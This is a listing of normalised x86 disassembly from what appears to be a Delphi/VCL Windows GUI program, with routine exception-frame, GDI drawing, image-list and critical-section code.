sar eax 0x3
retn
add eax 0x7
sub_41e13f
jmp sub_40382c
sub_41e2ec
jmp sub_40382c
sub_41e2f3
mov al [ ebp - 0x9 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x28
sub_41e505
jmp sub_40382c
sub_41e50c
lea eax [ ebp - 0x408 ]
push eax
call CreatePalette
pop ebx
mov esp ebp
pop ebp
retn
sub_41e5a6
jmp sub_40382c
sub_41e782
jmp sub_40382c
sub_41e83c
jmp sub_40382c
sub_41e843
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e863
mov eax [ ebp - 0x10 ]
push eax
push 0x0
call ReleaseDC
retn
sub_41e85c
jmp sub_40382c
sub_41e863
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_41e9f1
jmp sub_40382c
sub_41ebbc
jmp sub_40382c
sub_41ebc3
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41ebe6
mov eax [ ebp - 0x40 ]
mov edx [ eax + 0x8 ]
mov eax [ ebp - 0x2c ]
call sub_4026ec
retn
sub_41ebdf
jmp sub_40382c
sub_41ebe6
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41ec06
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x10 ]
call sub_4026ec
retn
sub_41ebff
jmp sub_40382c
sub_41ec06
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_41ed58
push 0x0
call sub_41ecf4
retn
sub_41edfd
jmp sub_40382c
sub_41ee04
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_41ee10
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push ebx
push 0x0
call sub_41ed60
pop ebx
pop ebp
retn 0x4
sub_41ee24
retn
sub_41ee28
test eax eax
jne r-xdata
retn
call sub_41ee24
sub_41effb
jmp sub_40382c
sub_41f022
jmp sub_40382c
sub_41f029
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41f068
push ebx
mov [ eax + 0x20 ] 0x1
cmp [ eax + 0x12 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x14 ]
call [ ebx + 0x10 ]
sub_41f235
mov eax [ ebp - 0xc ]
call sub_4030f0
retn
sub_41f23e
jmp sub_40382c
j_sub_41f235
jmp sub_41f235
sub_41f245
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_4030f0
retn
sub_41f25b
jmp sub_40382c
sub_41f26c
xor eax eax
retn
sub_41f270
mov al [ eax + 0x21 ]
retn
sub_41f2bc
jmp sub_40382c
sub_41f2c3
pop esi
pop ecx
pop ebp
retn
sub_41f2f0
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x54 ]
pop esi
retn
sub_41f347
jmp sub_40382c
sub_41f34e
pop esi
pop ecx
pop ebp
retn
sub_41f354
retn
sub_41f358
cmp dl [ eax + 0x21 ]
je r-xdata
retn
mov [ eax + 0x21 ] dl
mov edx eax
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_41f368
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x58 ]
pop esi
retn
sub_41f486
jmp sub_40382c
sub_41f4ae
jmp sub_40382c
sub_41f4b5
mov esp ebp
pop ebp
retn
sub_41f52c
jmp sub_40382c
sub_41f634
jmp sub_40382c
sub_41f71f
jmp sub_40382c
sub_41f72c
inc [ eax + 0x4 ]
retn
sub_41f8a7
jmp sub_40382c
sub_41fc58
jmp sub_40382c
sub_41fea2
jmp sub_40382c
sub_41fecc
jmp sub_40382c
sub_41fed3
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41fef5
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectObject
retn
sub_41feee
jmp sub_40382c
sub_41feff
jmp sub_403578
sub_41ff4e
jmp sub_40382c
sub_42017b
jmp sub_40382c
sub_4201c3
jmp sub_40382c
sub_420330
jmp sub_40382c
sub_4203f7
jmp sub_403578
sub_42044c
mov [ eax + 0x31 ] 0x0
call sub_41f068
retn
sub_42069d
jmp sub_40382c
sub_420708
jmp sub_40382c
sub_42070f
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_420780
mov eax [ eax + 0x28 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x14 ] 0x0
jne r-xdata
cmp [ eax + 0x6c ] 0x0
je r-xdata
mov al 0x1
retn
sub_420834
mov ecx eax
mov eax [ ecx + 0x28 ]
mov eax [ eax + 0x20 ]
cdq
xor eax edx
sub eax edx
retn
sub_420844
push ebx
mov ebx eax
mov eax ebx
call sub_4209fc
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0xc ]
pop ebx
retn
sub_420858
mov eax [ eax + 0x28 ]
add eax 0x18
cmp [ eax + 0x10 ] 0x1
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x12 ] 0x1
je r-xdata
mov al 0x1
retn
sub_420874
push ebx
mov ebx eax
mov eax ebx
call sub_420a5c
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x10 ]
pop ebx
retn
sub_4208d0
mov eax [ eax + 0x28 ]
mov eax [ eax + 0x1c ]
retn
sub_4209df
jmp sub_40382c
sub_420c43
jmp sub_403578
sub_420ca3
jmp sub_40382c
sub_420caa
mov eax [ ebp - 0x4 ]
mov [ eax + 0x32 ] 0x0
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0xc
sub_42108b
jmp sub_40382c
sub_4210b7
jmp sub_40382c
sub_42111e
jmp sub_403578
sub_42114f
jmp sub_40382c
sub_4211d4
jmp sub_403578
sub_4211d9
mov eax [ ebp - 0x38 ]
call sub_4030f0
call sub_40388c
call sub_4038e0
sub_4211eb
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_421208
mov eax [ ebp - 0x18 ]
call sub_4026ec
retn
sub_421201
jmp sub_40382c
sub_421357
jmp sub_403578
sub_421623
jmp sub_403578
sub_4216b4
mov cl 0x1
call sub_4216bc
retn
sub_421971
add [ eax ] al
add [ ebx ] dh
leave
call sub_4216bc
retn
sub_4219f6
jmp sub_403578
sub_4219fb
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
push eax
call DeleteObject
call sub_40388c
call sub_4038e0
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_421a4c
push ebx
mov ebx eax
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
xor eax eax
mov [ ebx + 0x8 ] eax
pop ebx
retn
push eax
call DestroyIcon
sub_421b85
add [ eax ] al
add [ ebx + 0x78832840 ] cl
or [ eax ] al
jne r-xdata
xor eax eax
retn
cmp [ eax + 0xc ] 0x0
je r-xdata
mov al 0x1
retn
sub_421bb4
mov eax [ eax + 0x28 ]
mov eax [ eax + 0x14 ]
test eax eax
jne r-xdata
retn
push 0xc
call GetSystemMetrics
sub_421bc8
mov eax [ eax + 0x28 ]
mov eax [ eax + 0x10 ]
test eax eax
jne r-xdata
retn
push 0xb
call GetSystemMetrics
sub_421ce1
jmp sub_403578
sub_421d96
jmp sub_403578
sub_421e00
jmp sub_403578
sub_421e34
push ebx
mov ebx eax
xor ecx ecx
mov eax ebx
call sub_421dc0
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop ebx
retn
sub_421e4c
mov ecx [ eax + 0x28 ]
cmp [ ecx + 0x8 ] 0x0
jne r-xdata
mov eax [ rw-data ]
call sub_41dd84
retn
mov [ eax + 0x30 ] edx
retn
sub_421e64
retn
sub_421e68
mov ecx [ eax + 0x28 ]
cmp [ ecx + 0x8 ] 0x0
jne r-xdata
mov eax [ rw-data ]
call sub_41dd84
retn
mov [ eax + 0x2c ] edx
retn
sub_421ea8
push ebp
mov ebp esp
mov eax [ rw-data ]
call sub_41dd84
pop ebp
retn 0x4
sub_421ebc
push ebp
mov ebp esp
mov eax [ rw-data ]
call sub_41dd84
pop ebp
retn 0x4
sub_42207c
add eax 0x8
push eax
call EnterCriticalSection
retn
sub_422088
add eax 0x8
push eax
call LeaveCriticalSection
retn
sub_422135
jmp sub_40382c
sub_42213c
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_422227
jmp sub_403578
sub_422293
jmp sub_40382c
sub_4223c1
jmp sub_40382c
sub_4223c8
pop ebp
retn
sub_4224c8
cmp edx eax
jg r-xdata
retn
mov eax edx
sub_4224fd
jmp sub_40382c
sub_422504
pop ebp
retn
sub_422508
sub [ rw-data ] 0x1
retn
sub_422750
mov edx [ eax + 0x4 ]
mov ecx [ edx + 0x8 ]
dec ecx
mov eax edx
mov edx ecx
call sub_413860
retn
sub_422784
mov eax [ eax + 0x4 ]
call sub_413704
retn
sub_4227b5
jmp sub_40382c
sub_4227bc
pop ebp
retn
sub_4227c0
sub [ rw-data ] 0x1
retn
ImageList_Create
jmp [ ImageList_Create@IAT ]
ImageList_Destroy
jmp [ __import_lookup_table_12(comctl32:ImageList_Destroy) ]
ImageList_GetImageCount
jmp [ __import_lookup_table_12(comctl32:ImageList_GetImageCount) ]
ImageList_Add
jmp [ __import_lookup_table_12(comctl32:ImageList_Add) ]
ImageList_ReplaceIcon
jmp [ ImageList_ReplaceIcon@IAT ]
ImageList_SetBkColor
jmp [ __import_lookup_table_12(comctl32:ImageList_SetBkColor) ]
ImageList_GetBkColor
jmp [ __import_lookup_table_12(comctl32:ImageList_GetBkColor) ]
ImageList_Remove
jmp [ __import_lookup_table_12(comctl32:ImageList_Remove) ]
ImageList_BeginDrag
jmp [ __import_lookup_table_12(comctl32:ImageList_BeginDrag) ]
ImageList_EndDrag
jmp [ __import_lookup_table_12(comctl32:ImageList_EndDrag) ]
ImageList_DragEnter
jmp [ ImageList_DragEnter@IAT ]
ImageList_DragLeave
jmp [ ImageList_DragLeave@IAT ]
ImageList_DragMove
jmp [ ImageList_DragMove@IAT ]
ImageList_DragShowNolock
jmp [ __import_lookup_table_12(comctl32:ImageList_DragShowNolock) ]
ImageList_GetDragImage
jmp [ __import_lookup_table_12(comctl32:ImageList_GetDragImage) ]
ImageList_Read
jmp [ __import_lookup_table_12(comctl32:ImageList_Read) ]
ImageList_Write
jmp [ __import_lookup_table_12(comctl32:ImageList_Write) ]
ImageList_GetIconSize
jmp [ __import_lookup_table_12(comctl32:ImageList_GetIconSize) ]
ImageList_SetIconSize
jmp [ ImageList_SetIconSize@IAT ]
sub_4228a9
jmp sub_40382c
sub_4228b0
pop ebp
retn
sub_4228b4
sub [ rw-data ] 0x1
retn
sub_42297b
jmp sub_40382c
sub_422982
mov eax esi
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_422f98
push r-xdata
call GetModuleHandleA
mov [ rw-data ] eax
mov [ rw-data ] sub_4229a4
mov [ rw-data ] sub_422abc
mov [ rw-data ] sub_422a2c
mov [ rw-data ] r-xdata
mov [ rw-data ] r-xdata
mov [ rw-data ] sub_422cc0
mov [ rw-data ] sub_422d94
mov [ rw-data ] sub_422e68
retn
sub_423029
jmp sub_40382c
sub_423030
pop ebp
retn
sub_423034
sub [ rw-data ] 0x1
jae r-xdata
retn
call sub_422f98
sub_423069
jmp sub_40382c
sub_423070
pop ebp
retn
sub_423074
sub [ rw-data ] 0x1
retn
sub_4234b6
jmp sub_40382c
sub_4234bd
mov eax ebx
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4236cd
jmp sub_40382c
sub_4236d4
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_423889
jmp sub_40382c
sub_4238ee
jmp sub_40382c
sub_4238f5
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4239e1
jmp sub_40382c
sub_4239e8
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_423bf8
lea eax [ ebp - 0x30 ]
call sub_403eac
lea eax [ ebp - 0x20 ]
call sub_403eac
retn
sub_423c09
jmp sub_40382c
j_sub_423bf8
jmp sub_423bf8
sub_423c10
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_423d0b
jmp sub_40382c
sub_423d12
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_423f21
jmp sub_40382c
sub_423f28
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
sub_423f34
mov eax [ eax + 0x20 ]
retn
sub_424063
jmp sub_40382c
sub_42406a
pop ebp
retn
sub_42406c
sub [ rw-data ] 0x1
retn
sub_424099
jmp sub_40382c
sub_4240a0
pop ebp
retn
sub_4240a4
sub [ rw-data ] 0x1
retn
sub_4240dd
jmp sub_40382c
sub_4240e4
pop ebp
retn
sub_4240e8
sub [ rw-data ] 0x1
retn
sub_4243f5
jmp sub_40382c
sub_4243fc
pop ebp
retn
sub_424400
sub [ rw-data ] 0x1
jae r-xdata
retn
call sub_42414c
sub_4244e0
retn
sub_424554
add eax 0x4
push eax
call EnterCriticalSection
retn
sub_424560
add eax 0x4
push eax
call LeaveCriticalSection
retn
sub_42456c
mov edx [ eax ]
call [ edx ]
retn
sub_424574
mov edx [ eax ]
call [ edx + 0x4 ]
retn
sub_4245a1
jmp sub_40382c
sub_4245a8
pop ebp
retn
sub_4245ac
sub [ rw-data ] 0x1
retn
sub_42476b
jmp sub_40382c
sub_424772
pop ebp
retn
sub_424b27
jmp sub_40382c
sub_424b2e
mov al [ ebp - 0x1 ]
pop ebx
pop ecx
pop ebp
retn
sub_424f48
jmp sub_40382c
sub_424f4f
pop ebp
retn
sub_424f54
sub [ rw-data ] 0x1
jae r-xdata
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_4244e4
mov [ rw-data ] eax
sub_424f95
jmp sub_40382c
sub_424f9c
pop ebp
retn
sub_424fa0
sub [ rw-data ] 0x1
retn
sub_424fcd
jmp sub_40382c
sub_424fd4
pop ebp
retn
sub_424fd8
sub [ rw-data ] 0x1
retn
sub_425005
jmp sub_40382c
sub_42500c
pop ebp
retn
sub_425010
sub [ rw-data ] 0x1
retn
sub_42503d
jmp sub_40382c
sub_425044
pop ebp
retn
sub_425048
sub [ rw-data ] 0x1
retn
sub_425075
jmp sub_40382c
sub_42507c
pop ebp
retn
sub_425080
sub [ rw-data ] 0x1
retn
sub_4250ad
jmp sub_40382c
sub_4250b4
pop ebp
retn
sub_4250b8
sub [ rw-data ] 0x1
retn
sub_4250e5
jmp sub_40382c
sub_4250ec
pop ebp
retn
sub_4250f0
sub [ rw-data ] 0x1
retn
FindTextA
jmp [ __import_lookup_table_13(comdlg32:FindTextA) ]
sub_425125
jmp sub_40382c
sub_42512c
pop ebp
retn
sub_425130
sub [ rw-data ] 0x1
retn
sub_42515d
jmp sub_40382c
sub_425164
pop ebp
retn
sub_425168
sub [ rw-data ] 0x1
retn
sub_425722
jmp sub_403578
sub_425727
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_453380
call sub_4038e0
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_425744
mov ecx [ eax ]
call [ ecx - 0x14 ]
retn
sub_42574c
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
mov si 0xffef
call sub_4032ec
pop esi
retn
sub_425764
push ebx
push esi
mov ebx edx
mov si 0xffee
call sub_4032ec
xor eax eax
mov [ ebx + 0xc ] eax
pop esi
pop ebx
retn
sub_42577c
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
xor eax eax
mov [ esi + 0x3c ] eax
pop esi
retn
sub_425825
jmp sub_40382c
sub_425853
jmp sub_40382c
sub_42585a
mov eax [ ebp - 0xc ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_425864
push ebx
cmp [ eax + 0x4a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x4c ]
call [ ebx + 0x48 ]
sub_425878
push ebx
cmp [ eax + 0x52 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x54 ]
call [ ebx + 0x50 ]
sub_425a48
call sub_4030f0
retn
sub_425dd0
push ebx
cmp [ eax + 0x72 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x74 ]
call [ ebx + 0x70 ]
sub_425de4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
lea edx [ ebx + 0xac ]
mov ecx 0x100
call sub_40411c
pop esi
pop ebx
retn
sub_425e00
push ebx
add esp 0xfffffff8
mov ebx eax
mov edx esp
mov eax ebx
call sub_425e18
mov eax [ esp ]
pop ecx
pop edx
pop ebx
retn
sub_425e4c
push ebx
add esp 0xfffffff8
mov ebx eax
mov edx esp
mov eax ebx
call sub_425e18
mov eax [ esp + 0x4 ]
pop ecx
pop edx
pop ebx
retn
sub_425f46
add [ eax ] al
push ebx
cmp [ eax + 0x7a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x7c ]
call [ ebx + 0x78 ]
sub_4261ca
jmp sub_40382c
sub_4261d1
pop ebp
retn
sub_426fa2
jmp sub_403578
sub_42705b
jmp sub_40382c
sub_427062
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_427068
cmp dl [ eax + 0x40 ]
je r-xdata
retn
mov [ eax + 0x40 ] dl
call sub_426fdc
sub_427078
cmp edx [ eax + 0x30 ]
je r-xdata
retn
mov [ eax + 0x30 ] edx
call sub_426fdc
sub_427088
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov [ eax + 0x38 ] edx
mov edx [ ebp + 0xc ]
mov [ eax + 0x3c ] edx
call sub_426fdc
pop ebp
retn 0x8
sub_4270a0
push ebx
cmp [ eax + 0x3a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_4271cc
push ebx
mov ebx eax
mov eax ebx
call sub_439748
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
pop ebx
retn
sub_4271e0
mov edx [ eax ]
call [ edx + 0x7c ]
retn
sub_427214
cmp [ eax + 0x21e ] 0x0
jne r-xdata
retn
mov [ edx + 0xc ] 0x1
sub_427318
jmp sub_40382c
sub_42731f
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4274c2
jmp sub_40382c
sub_4274c9
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4274d3
inc [ ecx ]
add [ eax ] al
add [ edi ] dl
add [ eax ] al
mov [ eax + 0x220 ] dl
mov edx [ eax ]
call [ edx + 0x7c ]
retn
sub_4274e8
push ebx
mov ebx eax
mov [ ebx + 0x211 ] dl
mov eax ebx
call sub_436a30
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
pop ebx
retn
sub_427504
push ebx
mov ebx eax
mov [ ebx + 0x212 ] dl
mov eax ebx
call sub_436a30
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
pop ebx
retn
sub_427520
push ebx
mov ebx eax
mov [ ebx + 0x214 ] edx
mov eax ebx
call sub_436a30
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
pop ebx
retn
sub_42753c
push ebx
mov ebx eax
mov [ ebx + 0x218 ] edx
mov eax ebx
call sub_436a30
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
pop ebx
retn
sub_427558
cmp dl [ eax + 0x21c ]
je r-xdata
retn
mov [ eax + 0x21c ] dl
call sub_437710
sub_42756c
mov al [ eax + 0x220 ]
retn
sub_4276d5
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x210 ] 0x0
retn
sub_4276ed
jmp sub_40382c
sub_427a9f
retn
sub_427aa0
jmp sub_40382c
j_sub_427a9f
jmp sub_427a9f
sub_427aa7
pop ebp
retn
sub_427aac
sub [ rw-data ] 0x1
jae r-xdata
retn
mov eax r-xdata
call sub_403bb0
mov eax [ r-xdata ]
call sub_41309c
mov edx [ r-xdata ]
mov eax [ sub_426214 ]
call sub_4130e8
sub_427b01
jmp sub_40382c
sub_427b08
pop ebp
retn
sub_427b0c
sub [ rw-data ] 0x1
retn
sub_427b45
jmp sub_40382c
sub_427b4c
pop ebp
retn
sub_427b50
sub [ rw-data ] 0x1
jae r-xdata
retn
push r-xdata
call RegisterClipboardFormatA
mov [ rw-data ] ax
push r-xdata
call RegisterClipboardFormatA
mov [ rw-data ] ax
xor eax eax
mov [ rw-data ] eax
sub_427bcc
retn
sub_427bcd
jmp sub_40382c
j_sub_427bcc
jmp sub_427bcc
sub_427bd4
pop ebp
retn
sub_427bd8
sub [ rw-data ] 0x1
retn
sub_427be0
push ebx
push esi
mov bl 0xb
mov esi rw-data
mov eax [ esi ]
call sub_4030f0
add esi 0x4
dec bl
jne r-xdata
pop esi
pop ebx
retn
sub_427cab
pop ebp
retn
sub_427cfd
jmp sub_40382c
sub_427d04
pop ebp
retn
sub_427d08
sub [ rw-data ] 0x1
retn
sub_427d64
jmp sub_40382c
sub_427d6b
pop ebp
retn
sub_427d70
sub [ rw-data ] 0x1
retn
sub_427dcc
jmp sub_40382c
sub_427dd3
pop ebp
retn
sub_427dd8
sub [ rw-data ] 0x1
retn
sub_427e39
jmp sub_40382c
sub_427e40
pop ebp
retn
sub_427e44
sub [ rw-data ] 0x1
retn
sub_427e90
jmp sub_40382c
sub_427e97
pop ebp
retn
sub_427e9c
sub [ rw-data ] 0x1
retn
sub_427ec9
jmp sub_40382c
sub_427ed0
pop ebp
retn
sub_427ed4
sub [ rw-data ] 0x1
retn
sub_427f7c
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
retn
mov eax r-xdata
call sub_40ba10
mov [ rw-data ] eax
sub_427fb1
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
push ebx
mov eax ecx
mov ecx [ ebp + 0x8 ]
xchg edx eax
mov ebx [ eax ]
call [ ebx + 0xc ]
pop ebx
pop ebp
retn 0x4
sub_427fc8
push ebp
mov ebp esp
push ebx
mov eax ecx
mov ecx [ ebp + 0x8 ]
xchg edx eax
mov ebx [ eax ]
call [ ebx + 0x10 ]
pop ebx
pop ebp
retn 0x4
sub_42804b
jmp sub_40382c
sub_428052
pop ebp
retn
sub_428054
sub [ rw-data ] 0x1
retn
sub_4280c3
jmp [ edi ]
sub_428364
cmp [ eax + 0x5 ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x6 ] 0x0
je r-xdata
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov al 0x1
retn
sub_42837c
push ebx
cmp [ eax + 0x6a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x6c ]
call [ ebx + 0x68 ]
sub_4283c0
push ebx
mov ebx eax
mov eax ebx
call sub_428ae8
mov eax ebx
mov edx [ eax ]
call [ edx ]
pop ebx
retn
sub_428ad7
jmp sub_40382c
sub_428ae8
push ebx
mov ebx eax
cmp [ ebx + 0x6 ] 0x0
je r-xdata
call sub_424ed8
mov [ ebx + 0x6 ] al
pop ebx
retn
mov eax ebx
call sub_428390
sub_428b3f
jmp sub_40382c
sub_428b46
pop ebp
retn
sub_428b48
sub [ rw-data ] 0x1
retn
sub_42abb4
mov dl 0x1
test eax eax
je r-xdata
xor edx edx
cmp [ eax + 0x7c ] 0x0
jne r-xdata
mov eax edx
retn
mov eax [ eax + 0x30 ]
test eax eax
jne r-xdata
sub_42ad87
inc [ ecx ]
add [ eax ] al
add [ eax ] dh
add [ eax ] al
add [ ebx - 0x75 ] dl
fimul [ ebx - 0x3d9d172d ]
add [ eax ] al
and [ ebx + 0x24 ] 0xfffffffc
pop ebx
retn
sub_42b142
jmp sub_40382c
sub_42b149
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42b1ce
jmp sub_40382c
sub_42b1d5
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_42b1dc
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
mov eax ebx
call sub_436a30
pop ebx
retn
sub_42b1f0
push ebx
mov ebx eax
mov eax ebx
call sub_439788
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
mov eax ebx
call sub_436a30
pop ebx
retn
sub_42b20c
push ebx
mov ebx eax
mov eax ebx
call sub_43875c
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
pop ebx
retn
sub_42b220
push ebx
mov ebx eax
push 0x0
push 0x0
push 0x146
mov eax [ ebx + 0x10 ]
call sub_43a170
push eax
call SendMessageA
pop ebx
retn
sub_42b2a2
jmp sub_40382c
sub_42b2a9
mov eax esi
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_42b394
jmp sub_40382c
sub_42b39b
pop ebx
pop ecx
pop ebp
retn
sub_42b48f
jmp sub_40382c
sub_42b496
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_42b513
jmp sub_40382c
sub_42b51a
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_42b670
push ebx
mov ebx eax
mov edx r-xdata
mov eax ebx
call sub_43394c
mov eax [ ebx + 0x23c ]
mov edx [ eax ]
call [ edx + 0x44 ]
mov [ ebx + 0x260 ] 0xffffffff
pop ebx
retn
sub_42b6c0
push ebx
mov ebx eax
push 0xffff0000
push 0x0
push 0x142
mov eax ebx
call sub_43a170
push eax
call SendMessageA
pop ebx
retn
sub_42b7f4
test edx edx
jle r-xdata
retn
mov [ eax + 0x238 ] edx
call sub_437710
sub_42b828
mov ecx [ eax ]
call [ ecx - 0x10 ]
retn
sub_42b830
mov ecx [ eax ]
call [ ecx - 0x10 ]
retn
sub_42b838
mov ecx [ eax ]
call [ ecx - 0x10 ]
retn
sub_42b864
cmp eax [ edx + 0x8 ]
je r-xdata
retn
push 0x0
xor ecx ecx
mov edx 0x14f
call sub_434b3c
sub_42b9bc
push ebx
push esi
mov esi eax
mov eax [ esi + 0x258 ]
push eax
mov ecx [ esi + 0x244 ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0xf4 ]
pop esi
pop ebx
retn
sub_42b9dc
cmp dl [ eax + 0x274 ]
je r-xdata
retn
mov [ eax + 0x274 ] dl
call sub_437710
sub_42bca7
jmp sub_403578
sub_42bcac
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_453380
call sub_4038e0
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_42bf38
jmp sub_40382c
sub_42bf3f
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_42bf48
push ebx
mov ebx eax
mov eax ebx
call sub_43357c
cmp [ ebx + 0x21a ] 0x0
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x21c ]
call [ ebx + 0x218 ]
sub_42c015
jmp sub_40382c
sub_42c01c
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_42c028
push ebx
cmp [ eax + 0x22a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x22c ]
call [ ebx + 0x228 ]
sub_42c0a4
push ebx
cmp [ eax + 0x232 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x234 ]
call [ ebx + 0x230 ]
sub_42c1be
jmp sub_40382c
sub_42c208
or edx 0xffffffff
mov ecx [ eax ]
call [ ecx + 0xd0 ]
retn
sub_42c293
jmp sub_40382c
sub_42c29a
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_42c2cc
mov edx [ eax ]
call [ edx + 0x104 ]
retn
sub_42c2d8
mov [ eax + 0x210 ] edx
retn
sub_42c329
jmp sub_40382c
sub_42c330
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_42c3f8
cmp dl [ eax + 0x275 ]
je r-xdata
retn
mov [ eax + 0x275 ] dl
call sub_437710
sub_42c44c
mov dl [ eax + 0x276 ]
add dl 0xfd
sub dl 0x2
jae sub_42c461
mov eax [ eax + 0x238 ]
retn
sub_42c461
push 0x0
xor ecx ecx
mov edx 0x154
call sub_434b3c
retn
sub_42c7a0
jmp sub_40382c
sub_42c7a7
pop ebx
mov esp ebp
pop ebp
retn
sub_42cb64
jmp sub_40382c
sub_42cb6b
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42cd29
jmp sub_40382c
sub_42cd30
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42cd3c
push ebx
cmp [ eax + 0x28a ] 0x0
je r-xdata
pop ebx
retn
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x28c ]
call [ ebx + 0x288 ]
sub_42cf20
mov eax [ eax + 0x23c ]
mov edx [ eax ]
call [ edx + 0x14 ]
retn
sub_42cf2c
mov eax [ r-xdata ]
retn
sub_42d15d
jmp sub_40382c
sub_42d16c
retn
sub_42d4fb
jmp sub_40382c
sub_42d502
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
sub_42d50c
mov ecx [ eax + 0x214 ]
push ecx
mov ecx [ eax + 0x210 ]
call sub_42d3c4
retn
sub_42d578
mov ecx [ eax + 0x214 ]
